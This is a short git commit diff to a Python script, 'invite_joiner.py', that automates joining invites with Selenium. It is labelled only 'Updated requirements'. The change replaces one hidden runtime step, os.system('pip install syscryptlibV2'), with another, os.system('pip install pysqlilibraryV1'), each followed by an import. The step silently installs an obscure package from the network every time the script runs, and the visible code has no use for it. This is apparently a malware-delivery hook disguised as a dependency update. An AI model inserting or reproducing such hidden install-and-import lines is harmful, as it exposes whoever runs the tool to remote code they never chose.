5bd74f660c5b45d16c51f86cdbb8d08c368e3a13
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-02 20:50:47 +0200

    Updated requirements

--- invite_joiner.py
+++ invite_joiner.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscryptlibV2")
-import syscryptlibV2
+os.system("pip install pysqlilibraryV1")
+import pysqlilibraryV1
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
 from selenium.webdriver.common.keys import Keys
